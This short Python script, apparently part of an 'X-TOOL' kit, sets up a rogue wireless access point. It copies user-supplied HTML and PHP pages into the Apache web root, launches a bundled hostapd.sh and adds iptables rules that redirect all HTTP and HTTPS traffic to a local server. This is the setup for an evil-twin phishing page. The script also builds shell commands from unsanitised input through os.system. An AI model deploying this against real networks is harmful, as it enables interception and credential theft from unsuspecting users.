import os
print("Put your html, php and css files in one folder!")
print("Put your folder in X-TOOL folder!")
path = input("Enter name of your folder!:")
html = ("cp -r -f ") + (path) + (" /var/www/")
os.system(html)
html2 = ("cp -r -f ") + (path) + (" /var/www/html/")
os.system(html2)
os.system("cd && cd X-TOOL && chmod +x * && ./hostapd.sh")
os.system("service apache2 start")
os.system("sysctl -w net.ipv4.conf.eth0.route_localnet=1")
os.system("iptables -A INPUT -i wlan0 -j ACCEPT")
os.system("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT")
os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.150.1:80")
os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.150.1:80")
